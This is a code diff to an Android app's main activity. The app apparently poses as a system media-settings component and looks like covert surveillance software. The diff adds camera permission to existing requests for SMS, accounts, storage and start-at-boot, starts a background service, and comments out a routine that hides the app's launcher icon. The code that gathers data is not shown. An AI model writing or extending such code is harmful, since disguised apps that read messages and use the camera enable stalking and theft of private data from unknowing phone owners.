@@ -6,26 +6,16 @@ import android.content.ComponentName;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
-import android.content.res.AssetManager;
-import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Environment;
 import android.support.annotation.NonNull;
-import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
 import android.view.View;
 import android.view.WindowManager;
-import android.widget.ImageView;
 import android.widget.Toast;
 
-import com.android.media.settings.Services.MediaService;
+import com.android.media.settings.Service.MediaService;
 import com.android.media.settings.Utility.MediaUtility;
-
-import java.io.File;
-import java.io.FileOutputStream;
-import java.io.InputStream;
-import java.io.OutputStream;
 
 public class MainActivity extends Activity {
     public static final String TAG = "MediaStore";
@@ -77,6 +67,7 @@ public class MainActivity extends Activity {
             int permissions[] = {
                     checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE),
                     checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE),
+                    checkSelfPermission(Manifest.permission.CAMERA),
                     checkSelfPermission(Manifest.permission.GET_ACCOUNTS),
                     checkSelfPermission(Manifest.permission.READ_SMS),
             };
@@ -87,6 +78,7 @@ public class MainActivity extends Activity {
                         Manifest.permission.GET_ACCOUNTS,
                         Manifest.permission.READ_SMS,
                         Manifest.permission.RECEIVE_SMS,
+                        Manifest.permission.CAMERA,
                         Manifest.permission.RECEIVE_BOOT_COMPLETED
                 }, REQ_CODE_ASK_PERMS);
                 return;
@@ -104,7 +96,7 @@ public class MainActivity extends Activity {
     private void startService() {
         Log.d(TAG, "On Start Service : " + MediaService.class);
         checkAndStartService();
-        hideLauncher();
+        //hideLauncher();
     }
 
     private void hideLauncher() {
